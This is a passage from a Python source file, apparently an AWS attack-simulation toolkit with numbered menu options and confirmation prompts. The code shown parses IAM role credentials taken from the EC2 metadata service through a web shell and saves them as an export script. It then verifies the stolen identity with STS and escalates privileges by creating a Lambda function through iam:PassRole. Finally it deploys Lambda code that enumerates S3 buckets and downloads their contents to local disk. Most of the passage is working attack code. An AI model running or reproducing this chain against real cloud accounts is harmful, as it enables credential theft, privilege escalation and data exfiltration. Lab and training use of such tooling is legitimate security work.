            if result and "SUCCESS:" in result:
                role_list = result[8:].strip()  # Remove "SUCCESS: " prefix
                
                # The response should contain role names, one per line
                roles = [role.strip() for role in role_list.split('\n') if role.strip()]
                
                if roles:
                    # Use the first role found
                    role_name = roles[0]
                    print(f"[INFO] Discovered IAM roles: {roles}")
                    return role_name
                else:
                    print("[WARNING] No IAM roles found in metadata service")
                    return None
            else:
                self.logger.error(
                    f"Failed to list IAM roles: {result}",
                    suggestion="Check metadata service connectivity and IAM role attachment"
                )
                return None
                
        except Exception as e:
            self.logger.error(
                f"Failed to discover IAM role: {str(e)}",
                suggestion="Verify web shell access and metadata service availability"
            )
            return None
            
    def _parse_credentials_from_json(self, raw_json):
        """Parse AWS credentials from JSON response"""
        try:
            # First try to parse as JSON
            import json
            import re
            
            # Clean up the response (remove HTML if present)
            json_data = raw_json
            
            # If the response contains HTML, try to extract JSON from it
            if '<' in json_data and '>' in json_data:
                # Look for JSON content within HTML
                json_match = re.search(r'{[^{}]*"AccessKeyId"[^{}]*}', json_data, re.DOTALL)
                if json_match:
                    json_data = json_match.group(0)
                else:
                    print("[WARNING] Could not extract JSON from HTML response")
                    print(f"[DEBUG] Raw response: {raw_json[:500]}")
                    
            # Try to parse as JSON
            try:
                credentials = json.loads(json_data)
                
                # Validate required fields
                required_fields = ['AccessKeyId', 'SecretAccessKey', 'Token']
                for field in required_fields:
                    if field not in credentials:
                        self.logger.error(
                            f"Missing required field: {field}",
                            suggestion="The metadata response may be malformed or incomplete"
                        )
                        return None
                        
                self.logger.success("Successfully parsed credentials from JSON")
                return credentials
                
            except json.JSONDecodeError:
                print("[WARNING] Failed to parse as JSON, trying regex extraction...")
                
                # Fallback to regex extraction
                return self._extract_credentials_with_regex(raw_json)
                
        except Exception as e:
            self.logger.error(
                f"Failed to parse credentials: {str(e)}",
                suggestion="Check the format of the metadata service response"
            )
            return None
            
    def _extract_credentials_with_regex(self, raw_data):
        """Extract credentials using regex patterns (fallback method)"""
        try:
            import re
            
            # Extract using regex patterns
            access_key_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', raw_data)
            secret_key_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', raw_data)
            token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', raw_data)
            expiration_match = re.search(r'"Expiration"\s*:\s*"([^"]+)"', raw_data)
            
            access_key = access_key_match.group(1) if access_key_match else None
            secret_key = secret_key_match.group(1) if secret_key_match else None
            token = token_match.group(1) if token_match else None
            expiration = expiration_match.group(1) if expiration_match else None
            
            if not access_key or not secret_key or not token:
                self.logger.error(
                    "Failed to extract credentials using regex",
                    suggestion="Metadata response format may be unexpected. Check raw metadata file for debugging."
                )
                print(f"[DEBUG] Access Key found: {'Yes' if access_key else 'No'}")
                print(f"[DEBUG] Secret Key found: {'Yes' if secret_key else 'No'}")
                print(f"[DEBUG] Token found: {'Yes' if token else 'No'}")
                
                # Save raw response for debugging
                self._save_raw_metadata(raw_data)
                return None
                
            credentials = {
                'AccessKeyId': access_key,
                'SecretAccessKey': secret_key,
                'Token': token
            }
            
            if expiration:
                credentials['Expiration'] = expiration
                
            self.logger.success("Successfully extracted credentials using regex")
            return credentials
            
        except Exception as e:
            self.logger.error(
                f"Regex extraction failed: {str(e)}",
                suggestion="This is a fallback extraction method failure. Check metadata service response format."
            )
            return None
            
    def _save_credentials_script(self, credentials):
        """Save credentials to a bash script for easy sourcing"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        script_file = f"aws_credentials_{timestamp}.sh"
        
        try:
            script_content = f"""#!/bin/bash
# AWS Credentials extracted from EC2 metadata service
# Generated: {datetime.now().isoformat()}

# Export AWS credentials
export AWS_ACCESS_KEY_ID="{credentials['AccessKeyId']}"
export AWS_SECRET_ACCESS_KEY="{credentials['SecretAccessKey']}"
export AWS_SESSION_TOKEN="{credentials['Token']}"

# Optional: Set default region (modify as needed)
# export AWS_DEFAULT_REGION="us-east-1"

echo "[SUCCESS] AWS credentials exported successfully!"
echo "Account ID: $(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo 'Unknown')"
echo "Identity: $(aws sts get-caller-identity --query Arn --output text 2>/dev/null || echo 'Unknown')"
"""
            
            with open(script_file, "w") as f:
                f.write(script_content)
                
            # Make script executable
            import stat
            os.chmod(script_file, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
            
            return script_file
            
        except Exception as e:
            self.logger.error(
                f"Failed to save credentials script: {str(e)}",
                suggestion="Check file permissions and disk space in current directory"
            )
            return None
            
    def _save_raw_metadata(self, raw_data):
        """Save raw metadata response for debugging"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        raw_file = f"metadata_raw_{timestamp}.txt"
        
        try:
            with open(raw_file, "w") as f:
                f.write(f"Raw metadata response - {datetime.now().isoformat()}\n")
                f.write("=" * 60 + "\n")
                f.write(raw_data)
                
            print(f"[INFO] Raw metadata saved to {raw_file} for debugging")
            
        except Exception as e:
            self.logger.error(
                f"Failed to save raw metadata: {str(e)}",
                suggestion="Check file permissions and disk space for debugging file creation"
            )
            
    def verify_identity_with_sts(self):
        """Verify AWS identity using extracted credentials with STS"""
        print("\n🔐 AWS STS Identity Verification")
        print("This will use extracted credentials to verify AWS identity via STS")
        
        # Get user confirmation
        if not self.safety_manager.get_user_confirmation("STS Identity Verification"):
            return False
            
        # Validate operation safety
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("verify_sts_identity")
        if not can_proceed:
            return False
            
        try:
            # Find the latest credentials script
            creds_script = self._find_latest_credentials_script()
            if not creds_script:
                self.logger.error(
                    "No extracted AWS credentials found",
                    suggestion="Please run option 6 (Extract AWS IAM Credentials) first"
                )
                return False
                
            print(f"[INFO] Using credentials from: {creds_script}")
            
            # Extract credentials from the script
            credentials = self._load_credentials_from_script(creds_script)
            if not credentials:
                self.logger.error(
                    "Failed to load credentials from script",
                    suggestion="Verify the credentials script file format and content"
                )
                return False
                
            # Create a boto3 session with the extracted credentials
            import boto3
            from botocore.exceptions import ClientError, NoCredentialsError
            
            print("[INFO] Creating boto3 session with extracted credentials...")
            
            session = boto3.Session(
                aws_access_key_id=credentials['access_key_id'],
                aws_secret_access_key=credentials['secret_access_key'],
                aws_session_token=credentials['session_token']
            )
            
            # Create STS client
            sts_client = session.client('sts')
            
            print("[INFO] Calling STS get-caller-identity...")
            
            # Get caller identity
            identity = sts_client.get_caller_identity()
            
            # Display identity information
            self.logger.success("AWS Identity Verified!")
            print(f"\n📋 Identity Information:")
            print(f"   Account ID: {identity.get('Account', 'Unknown')}")
            print(f"   User ID: {identity.get('UserId', 'Unknown')}")
            print(f"   ARN: {identity.get('Arn', 'Unknown')}")
            
            # Try to get additional information
            self._get_additional_identity_info(session)
            
            return True
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            error_message = e.response['Error']['Message']
            self.logger.error(
                f"AWS API Error ({error_code}): {error_message}",
                suggestion=self._get_sts_error_suggestion(error_code)
            )
            return False
            
        except NoCredentialsError:
            self.logger.error(
                "No valid credentials found",
                suggestion="Ensure credentials are properly extracted and loaded from the script file"
            )
            return False
            
        except Exception as e:
            self.logger.error(
                f"STS verification failed: {str(e)}",
                suggestion="Check network connectivity and AWS service availability"
            )
            return False
            
    def _find_latest_credentials_script(self):
        """Find the most recent AWS credentials script"""
        script_files = list(Path(".").glob("aws_credentials_*.sh"))
        
        if not script_files:
            return None
            
        # Return the most recent script
        latest_script = max(script_files, key=os.path.getctime)
        return str(latest_script)
        
    def _load_credentials(self):
        """Load AWS credentials from the most recent credentials file"""
        try:
            # Find the latest credentials script
            creds_script = self._find_latest_credentials_script()
            if not creds_script:
                return None
                
            # Load credentials from the script
            creds = self._load_credentials_from_script(creds_script)
            if not creds:
                return None
                
            # Return in the format expected by boto3
            return {
                'AccessKeyId': creds['access_key_id'],
                'SecretAccessKey': creds['secret_access_key'],
                'SessionToken': creds['session_token']
            }
            
        except Exception as e:
            self.logger.error(
                f"Failed to load credentials: {str(e)}",
                suggestion="Verify credentials script exists and is properly formatted"
            )
            return None
            
    def _load_credentials_from_script(self, script_path):
        """Load AWS credentials from shell script"""
        try:
            with open(script_path, "r") as f:
                script_content = f.read()
                
            # Extract credentials using regex
            import re
            
            access_key_match = re.search(r'export AWS_ACCESS_KEY_ID="([^"]+)"', script_content)
            secret_key_match = re.search(r'export AWS_SECRET_ACCESS_KEY="([^"]+)"', script_content)
            token_match = re.search(r'export AWS_SESSION_TOKEN="([^"]+)"', script_content)
            
            if not access_key_match or not secret_key_match or not token_match:
                self.logger.error(
                    "Could not parse all required credentials from script",
                    suggestion="Check the credentials script format - it may be corrupted or incomplete"
                )
                return None
                
            credentials = {
                'access_key_id': access_key_match.group(1),
                'secret_access_key': secret_key_match.group(1),
                'session_token': token_match.group(1)
            }
            
            print(f"[INFO] Successfully loaded credentials")
            print(f"[INFO] Access Key: {credentials['access_key_id'][:8]}...{credentials['access_key_id'][-4:]}")
            
            return credentials
            
        except Exception as e:
            self.logger.error(
                f"Failed to load credentials from script: {str(e)}",
                suggestion="Verify the script file exists and contains valid credential export statements"
            )
            return None
            
    def _get_sts_error_suggestion(self, error_code):
        """Get appropriate suggestion based on STS error code"""
        suggestions = {
            'InvalidUserID.NotFound': "The credentials may be valid but the associated user/role might not exist",
            'SignatureDoesNotMatch': "Invalid credentials - signature verification failed. Extract fresh credentials.",
            'TokenRefreshRequired': "Session token has expired - please extract fresh credentials using Option 6",
            'AccessDenied': "Credentials are valid but lack permission for STS operations",
            'RequestExpired': "Request has expired - check system clock and try again",
            'InvalidToken': "Session token is invalid or malformed - extract new credentials"
        }
        return suggestions.get(error_code, "Check AWS credentials and try again")
    
    def _get_additional_identity_info(self, session):
        """Get additional identity information if possible"""
        try:
            # Import ClientError locally
            from botocore.exceptions import ClientError
            
            # Try to get IAM user/role information
            iam_client = session.client('iam')
            
            # Try to get current user info
            try:
                user_info = iam_client.get_user()
                user_name = user_info['User']['UserName']
                print(f"   User Name: {user_name}")
                print(f"   Identity Type: IAM User")
                
                # Get user policies
                try:
                    attached_policies = iam_client.list_attached_user_policies(UserName=user_name)
                    if attached_policies['AttachedPolicies']:
                        print(f"   Attached Policies: {len(attached_policies['AttachedPolicies'])}")
                        for policy in attached_policies['AttachedPolicies'][:3]:  # Show first 3
                            print(f"     - {policy['PolicyName']}")
                except Exception:
                    print("   Could not retrieve user policies")
                    
                return True
                    
            except ClientError as e:
                error_code = e.response['Error']['Code']
                
                if error_code == 'ValidationError':
                    # This is an assumed role, not an IAM user
                    print("   Identity Type: Assumed Role (EC2 Instance Role)")
                    self.logger.success("Successfully verified role-based identity")
                    return True
                    
                elif error_code == 'AccessDenied':
                    # Permission issue - but this is now fixed with our CloudFormation update
                    print("   Warning: Limited IAM permissions for additional identity info")
                    print("   This may indicate the CloudFormation template needs to be updated")
                    return False
                    
                else:
                    print(f"   IAM Error ({error_code}): {e.response['Error']['Message']}")
                    return False
                    
        except Exception as e:
            print(f"[INFO] Could not retrieve additional identity information: {str(e)}")
            return False
            
    def enumerate_and_drain_s3(self):
        """Extract sensitive data from lambda-testing-toolkit S3 buckets using existing Lambda function from Option 8"""
        print("\n🎯 S3 Data Extraction via Lambda Privilege Escalation")
        print("This will use the existing Lambda function created in Option 8 to perform S3 operations")
        print("with escalated privileges (s3:ListAllMyBuckets + full S3 read permissions)")
        print("[INFO] Requires Option 8 (Lambda Privilege Escalation) to be completed first")
        
        if not self.safety_manager.get_user_confirmation("S3 Data Extraction via Lambda Privilege Escalation"):
            return False
            
        try:
            import boto3
            from botocore.exceptions import ClientError
            
            # Check if we have Lambda escalation results first
            lambda_results = self._load_latest_lambda_results()
            if not lambda_results:
                self.logger.error(
                    "No Lambda privilege escalation results found",
                    suggestion="Please run Option 8 (Lambda Privilege Escalation) first to establish escalated privileges"
                )
                return False
                
            # Extract target buckets from Lambda results
            target_buckets_from_results = self._extract_target_buckets_from_results(lambda_results)
            if not target_buckets_from_results:
                self.logger.error(
                    "No lambda-testing-toolkit S3 buckets found in escalation results",
                    suggestion="Ensure Option 8 completed successfully and discovered target S3 buckets"
                )
                return False
                
            print(f"[INFO] Target buckets discovered in Option 8: {target_buckets_from_results}")
            
            # Use EC2 credentials to create a new Lambda function for S3 operations
            ec2_creds = self._load_credentials()
            if not ec2_creds:
                self.logger.error(
                    "No base EC2 credentials found",
                    suggestion="Please run Option 7 (Verify Identity using STS) first to load credentials"
                )
                return False
                
            # Create session with EC2 credentials (has lambda:CreateFunction and iam:PassRole)
            ec2_session = boto3.Session(
                aws_access_key_id=ec2_creds['AccessKeyId'],
                aws_secret_access_key=ec2_creds['SecretAccessKey'],
                aws_session_token=ec2_creds.get('SessionToken'),
                region_name=self.aws_manager.current_region
            )
            
            # Get target role ARN from deployment data (DevTeamGroupRole)
            target_role_arn = self._get_target_lambda_role()
            if not target_role_arn:
                self.logger.error(
                    "Could not determine target Lambda role ARN",
                    suggestion="Verify deployment data contains valid IAM role information. Check CloudFormation stack status."
                )
                return False
                
            print(f"[INFO] Lambda execution role: {target_role_arn}")
            print(f"[INFO] This role has s3:ListAllMyBuckets and full S3 read permissions")
            
            # Create a temporary Lambda function for S3 operations (using builder pattern)
            lambda_function_name = self._create_temporary_s3_lambda(ec2_session, target_role_arn)
            if not lambda_function_name:
                self.logger.error(
                    "Failed to create temporary S3 Lambda function",
                    suggestion="Check IAM permissions for lambda:CreateFunction and iam:PassRole"
                )
                return False
                
            try:
                # Create output directory
                output_dir = Path("s3_extracted_data")
                output_dir.mkdir(exist_ok=True)
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                # Step 1: Use Lambda to list all buckets (with escalated s3:ListAllMyBuckets permission)
                print("\n[INFO] Step 1: Using Lambda to enumerate S3 buckets with escalated permissions...")
                all_buckets = self._lambda_list_s3_buckets(ec2_session, lambda_function_name)
                if not all_buckets:
                    self.logger.error(
                        "Failed to list S3 buckets via Lambda",
                        suggestion="Check Lambda function permissions and S3 service availability"
                    )
                    return False
                    
                # Step 2: Filter target buckets and enumerate their contents
                target_buckets_found = [b for b in all_buckets if 'lambda-testing-toolkit' in b]
                print(f"[INFO] Step 2: Found {len(target_buckets_found)} lambda-testing-toolkit bucket(s)")
                
                if not target_buckets_found:
                    print("[WARNING] No lambda-testing-toolkit buckets found")
                    return True
                    
                # Step 3: Extract data from target buckets
                s3_data = {
                    'buckets': {},
                    'summary': {
                        'total_buckets': len(target_buckets_found),
                        'total_objects': 0,
                        'sensitive_findings': []
                    }
                }
                
                for bucket_name in target_buckets_found:
                    print(f"[INFO] Step 3: Extracting data from {bucket_name} via Lambda...")
                    bucket_data = self._lambda_enumerate_bucket(ec2_session, lambda_function_name, bucket_name)
                    
                    if bucket_data:
                        s3_data['buckets'][bucket_name] = bucket_data
                        s3_data['summary']['total_objects'] += len(bucket_data.get('objects', []))
                        
                        # Check for sensitive findings
                        self._analyze_bucket_for_sensitive_data(bucket_name, bucket_data, s3_data['summary']['sensitive_findings'])
                        
                        self.logger.success(f"Extracted {len(bucket_data.get('objects', []))} objects from {bucket_name}")
                    else:
                        print(f"[WARNING] Failed to extract data from {bucket_name}")
                        
                # Step 4: Process and save results locally
                total_files_extracted = self._process_s3_data_from_lambda(s3_data, output_dir)
                
                # Step 5: Create comprehensive report
                report_file = output_dir / f"s3_enumeration_report_{timestamp}.txt"
                sensitive_findings = self._create_s3_report(s3_data, report_file)
                
                self.logger.success("S3 privilege escalation attack complete!")
                print(f"  🎯 Attack chain: EC2 Role → Lambda Creation (iam:PassRole) → S3 Access (s3:ListAllMyBuckets)")
                print(f"  📊 Report saved to: {report_file}")
                print(f"  📁 Extracted data saved to: {output_dir}")
                print(f"  📈 Total files extracted: {total_files_extracted}")
                print(f"  🔍 Buckets analyzed: {len(target_buckets_found)}")
                
                if sensitive_findings:
                    self.logger.security_event(
                        SecurityEventType.DATA_ENUMERATION, "HIGH",
                        f"SENSITIVE FINDINGS DETECTED: {len(sensitive_findings)} security issues found",
                        details={"findings_count": len(sensitive_findings), "buckets_analyzed": len(target_buckets_found)}
                    )
                    for finding in sensitive_findings[:5]:  # Show first 5
                        self.logger.security_event(SecurityEventType.DATA_ENUMERATION, "MEDIUM", f"Security Finding: {finding}")
                    if len(sensitive_findings) > 5:
                        self.logger.info(f"... and {len(sensitive_findings) - 5} more findings (see report for details)")
                        
                return True
                
            finally:
                # Always clean up the temporary Lambda function
                print("[INFO] Cleaning up temporary Lambda function...")
                self._cleanup_lambda_function(ec2_session, lambda_function_name)
            
        except Exception as e:
            self.logger.error(
                f"S3 privilege escalation attack failed: {str(e)}",
                suggestion="Check Lambda function creation and S3 permissions. Verify network connectivity."
            )
            return False
            
    def _create_s3_lambda_function(self, session, role_arn):
        """Create a specialized Lambda function for S3 operations"""
        try:
            from botocore.exceptions import ClientError
            lambda_client = session.client('lambda')
            
            # Generate unique function name
            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
            function_name = f"s3-enum-{timestamp}"
            
            print(f"[INFO] Creating S3 Lambda function: {function_name}")
            print(f"[INFO] Using role: {role_arn}")
            
            # Create Lambda code specifically for S3 operations
            lambda_code = self._prepare_s3_lambda_code()
            if not lambda_code:
                return None
                
            # Create the Lambda function
            response = lambda_client.create_function(
                FunctionName=function_name,
                Runtime='python3.9',
                Role=role_arn,
                Handler='s3_lambda_function.lambda_handler',
                Code={'ZipFile': lambda_code},
                Description='S3 enumeration and data extraction function',
                Timeout=300,  # 5 minutes for S3 operations
                MemorySize=512
            )
            
            self.logger.success(f"S3 Lambda function created: {response['FunctionArn']}")
            
            # Wait a moment for the function to be ready
            time.sleep(3)
            
            return function_name
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            error_message = e.response['Error']['Message']
            self.logger.error(
                f"S3 Lambda creation failed ({error_code}): {error_message}",
                suggestion="Check IAM permissions for lambda:CreateFunction and iam:PassRole operations"
            )
            return None
            
        except Exception as e:
            self.logger.error(
                f"Failed to create S3 Lambda function: {str(e)}",
                suggestion="Verify AWS credentials and Lambda service availability. Check network connectivity."
            )
            return None
            
    def _prepare_s3_lambda_code(self):
        """Prepare S3-specific Lambda function code"""
        try:
            import zipfile
            import io
            
            # Create S3-focused Lambda function code
            s3_lambda_code = '''
import boto3
import json

def lambda_handler(event, context):
    """Lambda function for S3 enumeration and data extraction"""
    try:
        s3_client = boto3.client('s3')
        
        action = event.get('action', 'list_buckets')
        target_buckets = event.get('target_buckets', [])
        
        if action == 'list_buckets':
            response = s3_client.list_buckets()
            buckets = [bucket['Name'] for bucket in response.get('Buckets', [])]
            return {
                'statusCode': 200,
                'body': json.dumps({
                    'buckets': buckets,
                    'target_buckets': [b for b in buckets if 'lambda-testing-toolkit' in b]
                })
            }
            
        elif action == 'enumerate_bucket':
            bucket_name = event.get('bucket_name')
            if not bucket_name:
                return {'statusCode': 400, 'body': json.dumps({'error': 'bucket_name required'})}
                
            bucket_data = {
                'name': bucket_name,
                'objects': [],
                'metadata': {}
            }
            
            try:
                # Get bucket tags
                try:
                    tags_response = s3_client.get_bucket_tagging(Bucket=bucket_name)
                    bucket_data['metadata']['tags'] = tags_response.get('TagSet', [])
                except:
                    bucket_data['metadata']['tags'] = []
                    
                # Get encryption status
                try:
                    enc_response = s3_client.get_bucket_encryption(Bucket=bucket_name)
                    bucket_data['metadata']['encryption'] = 'Enabled'
                except:
                    bucket_data['metadata']['encryption'] = 'Disabled'
                    
                # List objects
                objects_response = s3_client.list_objects_v2(Bucket=bucket_name)
                objects = objects_response.get('Contents', [])
                
                for obj in objects:
                    object_info = {
                        'key': obj['Key'],
                        'size': obj['Size'],
                        'last_modified': obj['LastModified'].isoformat(),
                        'content': None
                    }
                    
                    # Download small objects (< 1MB)
                    if obj['Size'] < 1024 * 1024:
                        try:
                            content_response = s3_client.get_object(Bucket=bucket_name, Key=obj['Key'])
                            content = content_response['Body'].read().decode('utf-8', errors='ignore')
                            object_info['content'] = content[:5000]  # First 5KB
                        except:
                            object_info['content'] = 'Error reading content'
                            
                    bucket_data['objects'].append(object_info)
                    
                return {
                    'statusCode': 200,
                    'body': json.dumps(bucket_data, default=str)
                }
                
            except Exception as e:
                return {
                    'statusCode': 500,
                    'body': json.dumps({'error': f'Failed to enumerate bucket: {str(e)}'})
                }
                
        else:
            return {
                'statusCode': 400,
                'body': json.dumps({'error': f'Unknown action: {action}'})
            }
            
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
'''
            
            # Create ZIP file in memory
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr('s3_lambda_function.py', s3_lambda_code)
                
            zip_buffer.seek(0)
            return zip_buffer.read()
            
        except Exception as e:
            self.logger.error(
                f"Failed to prepare S3 Lambda code: {str(e)}",
                suggestion="Check file system permissions and available memory for ZIP creation"
            )
            return None
            
    def _invoke_lambda_for_s3_operations(self, session, function_name, target_buckets):
        """Invoke Lambda function to perform S3 operations"""
        try:
            lambda_client = session.client('lambda')
            
            # First, list all buckets
            print("[INFO] Getting bucket list via Lambda...")
            payload = json.dumps({'action': 'list_buckets'})
            
            response = lambda_client.invoke(
                FunctionName=function_name,
                InvocationType='RequestResponse',
                Payload=payload
            )
            
            response_payload = json.loads(response['Payload'].read())
            if response_payload.get('statusCode') != 200:
                self.logger.error(
                    f"Failed to list buckets: {response_payload}",
                    suggestion="Check Lambda function permissions and S3 service connectivity"
                )
                return None
                
            bucket_data = json.loads(response_payload['body'])
            all_buckets = bucket_data.get('buckets', [])
            lambda_target_buckets = bucket_data.get('target_buckets', [])
            
            print(f"[INFO] Lambda found {len(all_buckets)} total buckets")
            print(f"[INFO] Lambda found {len(lambda_target_buckets)} target buckets")
            
            # Enumerate each target bucket
            s3_data = {
                'buckets': {},
                'summary': {
                    'total_buckets': len(lambda_target_buckets),
                    'total_objects': 0,
                    'sensitive_findings': []
                }
            }
            
            for bucket_name in lambda_target_buckets:
                print(f"[INFO] Enumerating bucket via Lambda: {bucket_name}")
                
                payload = json.dumps({
                    'action': 'enumerate_bucket',
                    'bucket_name': bucket_name
                })
                
                response = lambda_client.invoke(
                    FunctionName=function_name,
                    InvocationType='RequestResponse',
                    Payload=payload
                )
                
                response_payload = json.loads(response['Payload'].read())
                if response_payload.get('statusCode') == 200:
                    bucket_info = json.loads(response_payload['body'])
                    s3_data['buckets'][bucket_name] = bucket_info
                    s3_data['summary']['total_objects'] += len(bucket_info.get('objects', []))
                    
                    # Check for sensitive findings
                    tags = bucket_info.get('metadata', {}).get('tags', [])
                    for tag in tags:
                        if tag.get('Key') == 'DataClassification' and tag.get('Value') in ['Confidential', 'PII', 'TopSecret']:
                            s3_data['summary']['sensitive_findings'].append(
                                f"Bucket {bucket_name} contains {tag['Value']} data"
                            )
                            
                    if bucket_info.get('metadata', {}).get('encryption') == 'Disabled':
                        s3_data['summary']['sensitive_findings'].append(
                            f"Bucket {bucket_name} is not encrypted"
                        )
                        
                    self.logger.success(f"Enumerated {len(bucket_info.get('objects', []))} objects in {bucket_name}")
                else:
                    error_info = json.loads(response_payload['body'])
                    self.logger.error(
                        f"Failed to enumerate {bucket_name}: {error_info.get('error', 'Unknown error')}",
                        suggestion="Check Lambda function permissions for S3 bucket access and verify bucket exists"
                    )
                    
                time.sleep(1)  # Small delay between operations
                
            return s3_data
            
        except Exception as e:
            self.logger.error(
                f"Failed to invoke Lambda for S3 operations: {str(e)}",
                suggestion="Verify Lambda function exists and has proper S3 permissions"
            )
            return None
            
    def _process_s3_data_from_lambda(self, s3_data, output_dir):
        """Process S3 data returned from Lambda and save to local files"""
        try:
            total_files_extracted = 0
            
            for bucket_name, bucket_info in s3_data.get('buckets', {}).items():
                bucket_dir = output_dir / bucket_name
                bucket_dir.mkdir(exist_ok=True)
                
                for obj_info in bucket_info.get('objects', []):
                    if obj_info.get('content'):
                        file_path = bucket_dir / obj_info['key']
                        
                        # Create parent directories if needed
                        file_path.parent.mkdir(parents=True, exist_ok=True)
                        
                        try:
                            with open(file_path, 'w', encoding='utf-8', errors='ignore') as f:
                                f.write(obj_info['content'])
                            total_files_extracted += 1
                            print(f"  ✅ Extracted: {bucket_name}/{obj_info['key']}")
                        except Exception as e:
                            print(f"  ❌ Failed to save {obj_info['key']}: {str(e)}")
                            
            return total_files_extracted
            
        except Exception as e:
            self.logger.error(
                f"Failed to process S3 data from Lambda: {str(e)}",
                suggestion="Check local file system permissions and disk space"
            )
            return 0
            
    def _create_s3_report(self, s3_data, report_file):
        """Create S3 enumeration report from Lambda data"""
        try:
            report_lines = [
                "=" * 60,
                "S3 ENUMERATION REPORT (VIA LAMBDA)",
                f"Timestamp: {datetime.now().isoformat()}",
                f"Method: Lambda function invocation with escalated privileges",
                "=" * 60,
                ""
            ]
            
            summary = s3_data.get('summary', {})
            report_lines.extend([
                "SUMMARY:",
                f"Total buckets analyzed: {summary.get('total_buckets', 0)}",
                f"Total objects found: {summary.get('total_objects', 0)}",
                f"Sensitive findings: {len(summary.get('sensitive_findings', []))}",
                ""
            ])
            
            # Add bucket details
            for bucket_name, bucket_info in s3_data.get('buckets', {}).items():
                report_lines.extend([
                    f"BUCKET: {bucket_name}",
                    "-" * 40
                ])
                
                metadata = bucket_info.get('metadata', {})
                
                # Tags
                tags = metadata.get('tags', [])
                if tags:
                    report_lines.append("Tags:")
                    for tag in tags:
                        report_lines.append(f"  {tag.get('Key', 'Unknown')}: {tag.get('Value', 'Unknown')}")
                else:
                    report_lines.append("Tags: None")
                    
                # Encryption
                encryption = metadata.get('encryption', 'Unknown')
                report_lines.append(f"Encryption: {encryption}")
                
                # Objects
                objects = bucket_info.get('objects', [])
                if objects:
                    report_lines.append(f"\nObjects ({len(objects)} files):")
                    for obj in objects:
                        report_lines.append(
                            f"  - {obj.get('key', 'Unknown')} ({obj.get('size', 0)} bytes, "
                            f"modified: {obj.get('last_modified', 'Unknown')[:19]})"
                        )
                else:
                    report_lines.append("Objects: None")
                    
                report_lines.append("")
                
            # Add sensitive findings
            sensitive_findings = summary.get('sensitive_findings', [])
            if sensitive_findings:
                report_lines.extend([
                    "SENSITIVE FINDINGS:",
                    "-" * 20
                ])
                for finding in sensitive_findings:
                    report_lines.append(f"⚠️  {finding}")
                    
            # Save report
            with open(report_file, 'w') as f:
                f.write("\n".join(report_lines))
                
            return sensitive_findings
            
        except Exception as e:
            self.logger.error(
                f"Failed to create S3 report: {str(e)}",
                suggestion="Verify write permissions for the output directory"
            )
            return []
    
    def validate_lambda_privilege_escalation(self):
        """Perform Lambda privilege escalation and save escalated session credentials"""
        print("\n" + "="*60)
        print("🔐 LAMBDA PRIVILEGE ESCALATION")
        print("="*60)
        print("🎯 This will escalate privileges through Lambda and IAM PassRole")
        print("💾 The escalated session will be saved for use in Option 9 (S3 Operations)")
        
        # Get user confirmation
        if not self.safety_manager.get_user_confirmation("Lambda Privilege Escalation"):
            return False
            
        # Validate operation safety
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("lambda_privilege_escalation")
        if not can_proceed:
            return False
            
        try:
            # Find the latest credentials script (from Option 6)
            creds_script = self._find_latest_credentials_script()
            if not creds_script:
                self.logger.error(
                    "No extracted AWS credentials found",
                    suggestion="Please run option 6 (Extract AWS IAM Credentials) first to extract credentials"
                )
                return False
                
            # Load credentials from script
            credentials = self._load_credentials_from_script(creds_script)
            if not credentials:
                self.logger.error(
                    "Failed to load credentials from script",
                    suggestion="Check the credentials file format and integrity"
                )
                return False
                
            print(f"[INFO] Using EC2 credentials for privilege escalation...")
            
            # Create AWS session with extracted EC2 credentials
            import boto3
            from botocore.exceptions import ClientError, NoCredentialsError
            
            session = boto3.Session(
                aws_access_key_id=credentials['access_key_id'],
                aws_secret_access_key=credentials['secret_access_key'],
                aws_session_token=credentials['session_token']
            )
            
            # Get current identity (EC2 role)
            print("[INFO] Current identity (EC2 role):")
            current_identity = self._get_current_identity(session)
            if not current_identity:
                return False
                
            # Get target role ARN from deployment data
            target_role_arn = self._get_target_lambda_role()
            if not target_role_arn:
                self.logger.error(
                    "Could not determine target Lambda role ARN",
                    suggestion="Verify CloudFormation deployment contains the required IAM roles"
                )
                return False
                
            print(f"[INFO] Target Lambda role: {target_role_arn}")
            
            # Create Lambda function with elevated role
            lambda_function_name = self._create_lambda_function(session, target_role_arn)
            if not lambda_function_name:
                self.logger.error(
                    "Failed to create Lambda function",
                    suggestion="Check IAM permissions for lambda:CreateFunction and iam:PassRole operations"
                )
                return False
                
            # Validate the privilege escalation by invoking Lambda
            success = self._validate_escalation_via_lambda(session, lambda_function_name)
            
            # Clean up the Lambda function
            self._cleanup_lambda_function(session, lambda_function_name)
            
            if success:
                self.logger.success("Lambda privilege escalation completed successfully!")
                self.logger.info("Escalation chain: EC2 Role → Lambda Creation → Enhanced Permissions")
                return True
            else:
                self.logger.error(
                    "Lambda privilege escalation validation failed",
                    suggestion="Check Lambda function execution and IAM role permissions"
                )
                return False
                
        except Exception as e:
            self.logger.error(
                f"Lambda privilege escalation failed: {str(e)}",
                suggestion="Check AWS credentials, IAM permissions, and network connectivity"
            )
            return False
            
    def _get_current_identity(self, session):
        """Get the current AWS identity information"""
        try:
            sts_client = session.client('sts')
            identity = sts_client.get_caller_identity()
            
            print(f"   Account ID: {identity.get('Account', 'Unknown')}")
            print(f"   User ID: {identity.get('UserId', 'Unknown')}")
            print(f"   ARN: {identity.get('Arn', 'Unknown')}")
            
            return identity
            
        except Exception as e:
            self.logger.error(
                f"Failed to get current identity: {str(e)}",
                suggestion="Check AWS credentials and STS service availability"
            )
            return None
            
    def _get_target_lambda_role(self):
        """Get the target Lambda role ARN from deployment data"""
        try:
            # Load deployment data
